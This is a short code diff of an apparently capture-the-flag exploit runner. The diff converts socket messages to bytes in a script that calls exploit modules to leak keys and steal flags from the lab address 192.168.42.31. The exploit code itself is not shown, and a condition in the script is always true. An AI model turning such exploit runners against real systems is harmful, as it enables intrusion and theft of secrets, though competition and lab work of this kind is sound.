@@ -103,9 +103,9 @@ def main():
                     flags = saarlendar_exploit.exploit("192.168.42.31")
                     client_socket.send(b"Got flags: %s"+''.join(flags).encode('utf-8'))
                     exploitdirectfileaccess.exploit("192.168.42.31")
-                    client_socket.send("Exploits run successfully! ;)")
+                    client_socket.send(b"Exploits run successfully! ;)")
                 except:
-                    client_socket.send("Exploits run failed! :( )")
+                    client_socket.send(b"Exploits run failed! :( )")
 
             
             elif "3 in service":
@@ -113,10 +113,10 @@ def main():
                     exploitleakkey.attack_leak_key("192.168.42.31:8080")
                     exploitrcpoints.attack_rc_points("192.168.42.31:8080")
                     exploitrcshare.attack_rc_share("192.168.42.31:8080")
-                    client_socket.send("Exploits run successfully! :( )")
+                    client_socket.send(b"Exploits run successfully! :( )")
 
                 except:
-                    client_socket.send("Exploits run failed! :( )")
+                    client_socket.send(b"Exploits run failed! :( )")
 
 
 
